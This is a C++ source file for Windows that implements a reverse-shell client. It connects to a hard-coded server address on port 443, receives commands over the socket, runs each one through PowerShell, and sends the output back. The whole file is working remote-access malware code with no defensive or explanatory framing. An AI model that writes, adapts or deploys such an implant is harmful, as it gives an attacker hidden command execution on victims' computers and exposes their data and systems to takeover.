#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <thread>
#include <algorithm>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 443
#define BUFFER_SIZE 4096
#define TIMEOUT_SECONDS 5

int main() {
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) {
		std::cerr << "WSAStartup failed with error: " << result << '\n';
		return 1;
	}

	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		std::cerr << "socket failed with error: " << WSAGetLastError() << '\n';
		WSACleanup();
		return 1;
	}

	sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, SERVER_IP, &(serverAddress.sin_addr));

	result = connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress));
	if (result == SOCKET_ERROR) {
		std::cerr << "connect failed with error: " << WSAGetLastError() << '\n';
		closesocket(clientSocket);
		WSACleanup();
		return 1;
	}

	std::cout << "Connected to the server at IP " << SERVER_IP << " and port " << SERVER_PORT << ".\n";
	std::cout << "Waiting for command from the server...\n";

	std::thread reader([&]() {
		CHAR buffer[BUFFER_SIZE];
		while (true) {
			\
				//check if there is data avialable for reading
				u_long available = 0;
			if (ioctlsocket(clientSocket, FIONREAD, &available) != 0) {
				break;
			}
			if (available == 0) {
				continue;
			}

			//program recieves command from the server using recv
			int recvResult = recv(clientSocket, buffer, sizeof(buffer), 0);
			if (recvResult <= 0) {
				break;
			}

			//converts received command and prints
			std::string command(buffer, recvResult);
			std::cout << command;

			//executes command using powershell
			std::string fullCommand = "powershell.exe -Command \"" + command + "\"";
			FILE* pipe = _popen(fullCommand.c_str(), "r");
			if (pipe) {
				std::string response;
				while (fgets(buffer, sizeof(buffer), pipe)) {
					response += buffer;
				}
				_pclose(pipe);

				//send completed response back to server
				send(clientSocket, response.c_str(), response.size(), 0);
			}

			//wait for timeout allowing client to wait for new commands
			fd_set readSet;
			FD_ZERO(&readSet);
			FD_SET(clientSocket, &readSet);
			struct timeval timeout;
			timeout.tv_sec = TIMEOUT_SECONDS;
			timeout.tv_usec = 0;
			select(0, &readSet, NULL, NULL, &timeout);
		}
		});

	//wait for the reader to complete execution
	reader.join();

	closesocket(clientSocket);
	WSACleanup();
	return 0;
}